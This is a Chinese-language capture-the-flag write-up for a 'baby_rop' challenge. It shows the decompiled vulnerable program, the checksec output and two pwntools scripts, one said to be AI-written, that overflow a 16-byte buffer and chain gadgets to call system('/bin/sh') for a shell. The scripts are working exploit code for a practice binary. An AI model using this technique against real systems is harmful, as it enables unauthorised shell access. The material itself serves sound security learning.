# baby_rop

反编译：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  system("echo -n \"What's your name? \"");
  __isoc99_scanf("%s", v4);
  printf("Welcome to the Pwn World, %s!\n", v4);
  return 0;
}
```

checksec 输出：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

栈不可执行，因此用 ROP 来调用 system("/bin/sh")，程序中有 /bin/sh 的字符串，同时还有 system 的 plt stub：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("./babyrop")
elf = ELF("./babyrop")

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address


sh_addr = next(elf.search(b"/bin/sh\x00"))
payload = (
    b"A" * 0x18 + p64(pop_rdi_ret) + p64(sh_addr) + p64(ret) + p64(elf.plt["system"])
)
print(payload)
p.recvuntil(b"What's your name? ")
p.send(payload)
p.interactive()
```

AI 完成的攻击脚本，思路和上面是一样的：

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF('./babyrop')

import sys
LOCAL = '--remote' not in sys.argv

if LOCAL:
    p = process('./babyrop')
else:
    p = remote('localhost', 9999)

# Gadgets
pop_rdi = 0x400683
ret = 0x400479

bin_sh = next(elf.search(b'/bin/sh'))
system_plt = elf.plt['system']

# Stack: [buf 16] [saved rbp 8] [ret addr]
payload = b'A' * 16  # fill buffer
payload += b'B' * 8   # saved rbp
payload += p64(ret)       # stack alignment
payload += p64(pop_rdi)   # pop rdi; ret
payload += p64(bin_sh)    # rdi = "/bin/sh"
payload += p64(system_plt)  # system("/bin/sh")

p.sendline(payload)
p.interactive()
```
